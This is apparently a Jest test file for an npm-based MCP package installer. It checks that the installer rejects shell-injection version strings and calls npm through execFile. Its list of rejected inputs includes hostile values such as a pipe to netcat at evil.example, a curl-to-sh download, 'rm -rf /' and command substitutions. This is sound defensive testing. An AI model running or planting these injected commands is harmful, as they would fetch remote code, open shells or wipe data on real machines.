import * as path from 'path'
import * as util from 'util'
import * as childProcess from 'child_process'
import { existsSync, mkdir, readFile, rm } from 'fs-extra'
import { PackageInfo, PackageService } from '../src/services/packages'
import { MCPService } from '../src/services/mcp'
import { MongoConnectionParams } from '../src/utils/mongodb'

jest.mock('child_process', () => {
  const nodeUtil = require('util') as typeof import('util')
  const exec = jest.fn()
  const execFile = jest.fn()
  const execPromisified = jest.fn()
  const execFilePromisified = jest.fn()
  ;(exec as unknown as Record<symbol, unknown>)[nodeUtil.promisify.custom] = execPromisified
  ;(execFile as unknown as Record<symbol, unknown>)[nodeUtil.promisify.custom] = execFilePromisified
  return { exec, execFile }
})

jest.mock('fs-extra', () => ({
  existsSync: jest.fn(),
  mkdir: jest.fn(),
  readFile: jest.fn(),
  rm: jest.fn()
}))

type ExecResult = { stdout: string; stderr: string }

type DbMock = {
  upsert: jest.Mock<Promise<unknown>, [Partial<PackageInfo> | PackageInfo, Record<string, unknown>]>
  update: jest.Mock<Promise<unknown>, [Partial<PackageInfo> | PackageInfo, Record<string, unknown>]>
  find: jest.Mock<Promise<PackageInfo[]>, [Record<string, unknown>]>
  findOne: jest.Mock<Promise<PackageInfo | null>, [Record<string, unknown>]>
  delete: jest.Mock<Promise<unknown>, [Record<string, unknown>, boolean?]>
}

type McpServiceMock = {
  addServer: jest.Mock
  getServer: jest.Mock
  disableServer: jest.Mock
  enableServer: jest.Mock
  updateServer: jest.Mock
  deleteServer: jest.Mock
}

const mongoParams: MongoConnectionParams = {
  host: 'mongodb://localhost:27017',
  db: 'test',
  user: 'test',
  pass: 'test'
}

const execPromisifiedMock = (
  childProcess.exec as unknown as Record<typeof util.promisify.custom, jest.Mock<Promise<ExecResult>, unknown[]>>
)[util.promisify.custom]
const execFilePromisifiedMock = (
  childProcess.execFile as unknown as Record<typeof util.promisify.custom, jest.Mock<Promise<ExecResult>, unknown[]>>
)[util.promisify.custom]
const existsSyncMock = existsSync as unknown as jest.Mock
const mkdirMock = mkdir as unknown as jest.Mock
const readFileMock = readFile as unknown as jest.Mock
const rmMock = rm as unknown as jest.Mock

const createService = (): {
  service: PackageService
  dbMock: DbMock
  mcpMock: McpServiceMock
} => {
  const mcpMock: McpServiceMock = {
    addServer: jest.fn().mockResolvedValue({
      name: 'srv',
      transportType: 'stdio',
      command: 'node',
      args: [],
      env: {},
      status: 'disconnected',
      enabled: true
    }),
    getServer: jest.fn(),
    disableServer: jest.fn(),
    enableServer: jest.fn(),
    updateServer: jest.fn(),
    deleteServer: jest.fn()
  }
  const service = new PackageService({
    mongoParams,
    mcpService: mcpMock as unknown as MCPService
  })

  const dbMock: DbMock = {
    upsert: jest.fn().mockResolvedValue({}),
    update: jest.fn().mockResolvedValue({}),
    find: jest.fn().mockResolvedValue([]),
    findOne: jest.fn().mockResolvedValue(null),
    delete: jest.fn().mockResolvedValue({})
  }

  ;(service as unknown as { packagesDBClient: DbMock }).packagesDBClient = dbMock

  return { service, dbMock, mcpMock }
}

describe('PackageService command-injection hardening', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    existsSyncMock.mockReturnValue(false)
    mkdirMock.mockResolvedValue(undefined)
    readFileMock.mockResolvedValue('{}')
    rmMock.mockResolvedValue(undefined)
    execPromisifiedMock.mockResolvedValue({ stdout: '', stderr: '' })
    execFilePromisifiedMock.mockResolvedValue({ stdout: '', stderr: '' })
  })

  describe('installPackage version validation', () => {
    const maliciousVersions = [
      '0.0.0 & echo POC>%TEMP%\\mcp-api-version-cmdi-poc.txt & rem',
      '1.0.0; touch /tmp/pwn',
      '1.0.0 | nc evil.example 4444',
      '1.0.0`whoami`',
      '1.0.0$(id)',
      '1.0.0\nrm -rf /',
      '--registry=http://evil.example',
      '-g',
      '1.0.0 && curl http://evil.example/x.sh | sh'
    ]

    test.each(maliciousVersions)('rejects malicious version %p', async (malicious) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: malicious,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      // Should never spawn an install if validation failed
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'install'
      )
      expect(installCalls.length).toBe(0)
      const execInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(execInstallCalls.length).toBe(0)
    })

    const validVersions = ['1.2.3', '^1.2.3', '~1.0.0', '>=1.0.0', '1.x', '*', 'latest', 'beta', '1.0.0-alpha.1']
    test.each(validVersions)('accepts valid version %p', async (valid) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: valid,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)
    })
  })

  test('installPackage uses execFile (not shell exec) for npm install with package and version as separate spec arg', async () => {
    const { service } = createService()

    const result = await service.installPackage({
      name: 'left-pad',
      version: '1.2.3',
      serverName: 'left-pad-server'
    })

    expect(result.success).toBe(true)

    // The shell-form `exec` MUST NOT be used to run `npm install ...`
    const shellInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm install')
    )
    expect(shellInstallCalls.length).toBe(0)

    // execFile must be called with `npm install left-pad@1.2.3` as separate args
    const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[]).includes('install')
    )
    expect(installCalls.length).toBeGreaterThan(0)
    const installCall = installCalls[0]
    const cmd = installCall[0] as string
    const cmdArgs = installCall[1] as string[]
    expect(cmd === 'npm' || cmd === 'npm.cmd').toBe(true)
    expect(cmdArgs).toEqual(['install', 'left-pad@1.2.3'])
  })

  test('installPackage uses execFile to initialize package.json (no shell)', async () => {
    const { service } = createService()

    await service.installPackage({
      name: 'left-pad',
      serverName: 'left-pad-server'
    })

    // The shell-form `exec` MUST NOT be used to run `npm init`
    const shellInitCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm init')
    )
    expect(shellInitCalls.length).toBe(0)

    const initCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[])[0] === 'init'
    )
    expect(initCalls.length).toBe(1)
    expect(initCalls[0][1]).toEqual(['init', '-y'])
  })

  describe('upgradePackage version validation', () => {
    const existingPackage: PackageInfo = {
      name: 'left-pad',
      version: '1.0.0',
      installPath: 'packages/left-pad',
      status: 'installed',
      installed: new Date('2025-01-01T00:00:00.000Z'),
      mcpServerId: 'left-pad-server',
      enabled: true,
      runtime: 'node'
    }

    test('upgradePackage rejects malicious version', async () => {
      const { service, dbMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      const result = await service.upgradePackage('left-pad-server', '0.0.0 & echo POC & rem')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      const upgradeCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'install'
      )
      expect(upgradeCalls.length).toBe(0)
      const shellUpgradeCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(shellUpgradeCalls.length).toBe(0)
    })

    test('upgradePackage uses execFile to run npm install', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      mcpMock.getServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.disableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: [],
        env: {},
        status: 'disconnected',
        enabled: false
      })
      mcpMock.enableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.updateServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      readFileMock.mockResolvedValue(JSON.stringify({ version: '1.5.0', main: 'index.js' }))

      const result = await service.upgradePackage('left-pad-server', '1.5.0')

      expect(result.success).toBe(true)

      // No `npm install` via shell-form exec
      const shellInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(shellInstallCalls.length).toBe(0)

      // execFile invoked with proper args
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBeGreaterThan(0)
      const cmdArgs = installCalls[0][1] as string[]
      expect(cmdArgs).toEqual(['install', 'left-pad@1.5.0'])
    })

    test('upgradePackage with no version uses @latest spec via execFile', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      mcpMock.getServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.disableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: [],
        env: {},
        status: 'disconnected',
        enabled: false
      })
      mcpMock.enableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.updateServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      readFileMock.mockResolvedValue(JSON.stringify({ version: '2.0.0', main: 'index.js' }))

      const result = await service.upgradePackage('left-pad-server')

      expect(result.success).toBe(true)

      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBeGreaterThan(0)
      const cmdArgs = installCalls[0][1] as string[]
      expect(cmdArgs).toEqual(['install', 'left-pad@latest'])
    })
  })

  test('checkForUpdates uses execFile (not shell exec) for npm view', async () => {
    const { service, dbMock } = createService()
    dbMock.find.mockResolvedValue([
      {
        name: '@missionsquad/mcp-github',
        version: '1.0.0',
        installPath: 'packages/mcp-github',
        status: 'installed',
        installed: new Date('2025-01-01T00:00:00.000Z'),
        mcpServerId: 'github-server',
        enabled: true,
        runtime: 'node'
      }
    ])

    execFilePromisifiedMock.mockImplementation(async (...args: unknown[]) => {
      const cmd = args[0] as string
      const cmdArgs = (args[1] as string[]) ?? []
      if ((cmd === 'npm' || cmd === 'npm.cmd') && cmdArgs[0] === 'view') {
        return { stdout: '1.1.0\n', stderr: '' }
      }
      return { stdout: '', stderr: '' }
    })

    const result = await service.checkForUpdates()

    expect(result.updates).toEqual([
      {
        serverName: 'github-server',
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        updateAvailable: true
      }
    ])

    // No `npm view` via shell-form exec
    const shellViewCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm view')
    )
    expect(shellViewCalls.length).toBe(0)

    // execFile invoked with `view <name> version` args
    const viewCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[])[0] === 'view'
    )
    expect(viewCalls.length).toBe(1)
    expect(viewCalls[0][1]).toEqual(['view', '@missionsquad/mcp-github', 'version'])
  })
})
